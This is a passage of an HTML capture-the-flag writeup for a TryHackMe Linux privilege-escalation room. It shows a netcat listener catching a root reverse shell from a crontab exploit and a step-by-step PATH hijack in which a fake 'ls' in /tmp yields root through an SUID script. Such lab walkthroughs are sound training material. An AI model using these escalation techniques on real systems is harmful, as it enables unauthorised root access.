viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="7"><li>After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using: &quot;<code>nc -lvp 8888</code>&quot; and wait for our shell to land!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Common Linux Privesc$ nc -nlvp 8888</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">listening on [any] 8888 ...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="8"><li>After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">kali@kali:~/CTFs/tryhackme/Common Linux Privesc$ nc -nlvp 8888</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">listening on [any] 8888 ...</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">connect to [10.8.106.222] from (UNKNOWN) [10.10.98.105] 43252</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">whoami</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-9-exploiting-path-variable">Task 9 Exploiting PATH Variable<a href="#task-9-exploiting-path-variable" class="hash-link" aria-label="Direct link to Task 9 Exploiting PATH Variable" title="Direct link to Task 9 Exploiting PATH Variable"></a></h2><p><strong>What is PATH?</strong></p><p>PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user.</p><p>It is very simple to view the Path of the relevant user with help of the command &quot;<code>echo $PATH</code>&quot;.</p><p><strong>How does this let us escalate privileges?</strong></p><p>Let&#x27;s say we have an SUID binary. Running it, we can see that its calling the system shell to do a basic process like list processes with &quot;ps&quot;. Unlike in our previous SUID example, in this situation we can&#x27;t exploit it by supplying an argument for command injection, so what can we do to try and exploit this?</p><p>We can re-write the PATH variable to a location of our choosing! So when the SUID binary calls the system shell to run an executable, it runs one that we&#x27;ve written instead!</p><p>As with any SUID file, it will run this command with the same privileges as the owner of the SUID file! If this is root, using this method we can run whatever commands we like as root!</p><p><strong>Let&#x27;s do it!</strong></p><ol><li>Going back to our local ssh session, not the netcat root session, you can close that now, let&#x27;s exit out of root from our previous task by typing &quot;<strong>exit</strong>&quot;. Then use &quot;<strong>su</strong>&quot; to swap to <strong>user5</strong>, with the password &quot;<strong>password</strong>&quot;</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user4@polobox:~$ su - user5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Password: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4 user5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 14:33:10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 342/1991MB (17.18%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="2"><li>Let&#x27;s go to user5&#x27;s home directory, and run the file &quot;script&quot;. What command do we think that it&#x27;s executing?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$ ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$ ./script </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Desktop  Documents  Downloads  Music  Pictures  Public  script  Templates  Videos</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>ls</code></p><ol start="3"><li>Now we know what command to imitate, let&#x27;s change directory to &quot;tmp&quot;.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$ cd /tmp</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:/tmp$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="4"><li>Now we&#x27;re inside tmp, let&#x27;s create an imitation executable. The format for what we want to do is: echo &quot;<!-- -->[whatever command we want to run]<!-- -->&quot; &gt; <!-- -->[name of the executable we&#x27;re imitating]<!-- --> What would the command look like to open a bash shell, writing to a file with the name of the executable we&#x27;re imitating</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:/tmp$ echo &quot;/bin/bash&quot; &gt; ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:/tmp$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>echo &quot;/bin/bash&quot; &gt; ls</code></p><ol start="5"><li>Great! Now we&#x27;ve made our imitation, we need to make it an executable. What command do we execute to do this?</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:/tmp$ chmod +x ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:/tmp$ </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>chmod +x ls</code></p><ol start="6"><li>Now, we need to change the PATH variable, so that it points to the directory where we have our imitation &quot;ls&quot; stored! We do this using the command &quot;export PATH=/tmp:$PATH&quot; Note, this will cause you to open a bash prompt every time you use &quot;ls&quot;. If you need to use &quot;ls&quot; before you finish the exploit, use &quot;/bin/ls&quot; where the real &quot;ls&quot; executable is. Once you&#x27;ve finished the exploit, you can exit out of root and use &quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH&quot; to reset the PATH variable back to default, letting you use &quot;ls&quot; again!</li></ol><p><code>No answer needed</code></p><ol start="7"><li>Now, change directory back to user5&#x27;s home directory.</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:/tmp$ cd ~</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$ ls</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4 user5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 14:42:40</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 343/1991MB (17.23%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><ol start="8"><li>Now, run the &quot;script&quot; file again, you should be sent into a root bash prompt! Congratulations!</li></ol><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token plain">user5@polobox:~$ ./script </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Welcome to Linux Lite 4.4 user5</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Monday 19 October 2020, 14:43:24</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Memory Usage: 347/1991MB (17.43%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Disk Usage: 6/217GB (3%)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@polobox:~# </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>No answer needed</code></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="task-10-expanding-your-knowledge">Task 10 Expanding Your Knowledge<a href="#task-10-expanding-your-knowledge" class="hash-link" aria-label="Direct link to Task 10 Expanding Your Knowledge" title="Direct link to Task 10 Expanding Your Knowledge"></a></h2><p><strong>Further Learning</strong></p><p>There is never a &quot;magic&quot; answer in the huge area that is Linux Privilege Escalation. This is simply a few examples of basic things to watch out for when trying to escalate privileges.The only way to get better at it, is to practice and build up experience. Checklists are a good way to make sure you haven&#x27;t missed anything during your enumeration stage, and also to provide you with a resource to check how to do things if you forget exactly what commands to use.</p><p>Below is a list of good checklists to apply to CTF or penetration test use cases.Although I encourage you to make your own using CherryTree or whatever notes application you prefer.</p><ul><li><a href="https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md" target="_blank" rel="noopener noreferrer">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</a></li><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener noreferrer">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</a></li><li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html" target="_blank" rel="noopener noreferrer">https://sushant747.gitbooks.io/total-oscp-guide/privilege<em>escalation</em>-_linux.html</a></li><li><a href="https://payatu.com/guide-linux-privilege-escalation" target="_blank" rel="noopener noreferrer">https://payatu.com/guide-linux-privilege-escalation</a></li></ul><p><strong>Thank you</strong></p><p>Thanks for taking the time to work through this room, I wish you the best of luck in future.</p><p>~ Polo</p><ol><li>Well done, you did it!</li></ol><p><code>No answer needed</code></p></div></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/Tryhackme/Cicada-3301 Vol.1/Cicada 3301 Vol.1/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Cicada-3301 Vol:1</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/Tryhackme/ConvertMyVideo/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">ConvertMyVideo</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#-we-will-cover--the-topics" class="table-of-contents__link toc-highlight"> We will cover  the topics</a></li><li><a href="#task-1-get-connected" class="table-of-contents__link toc-highlight">Task 1 Get Connected</a></li><li><a href="#task-2-understanding-privesc" class="table-of-contents__link toc-highlight">Task 2 Understanding Privesc</a></li><li><a href="#task-3-direction-of-privilege-escalation" class="table-of-contents__link toc-highlight">Task 3 Direction of Privilege Escalation</a></li><li><a href="#task-4-enumeration" class="table-of-contents__link toc-highlight">Task 4 Enumeration</a></li><li><a href="#task-5-abusing-suidguid-files" class="table-of-contents__link toc-highlight">Task 5 Abusing SUID/GUID Files</a></li><li><a href="#task-6-exploiting-writeable-etcpasswd" class="table-of-contents__link toc-highlight">Task 6 Exploiting Writeable /etc/passwd</a></li><li><a href="#task-7-escaping-vi-editor" class="table-of-contents__link toc-highlight">Task 7 Escaping Vi Editor</a></li><li><a href="#task-8-exploiting-crontab" class="table-of-contents__link toc-highlight">Task 8 Exploiting Crontab</a></li><li><a href="#task-9-exploiting-path-variable" class="table-of-contents__link toc-highlight">Task 9 Exploiting PATH Variable</a></li><li><a href="#task-10-expanding-your-knowledge" class="table-of-contents__link toc-highlight">Task 10 Expanding Your Knowledge</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with     by CyFun  2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>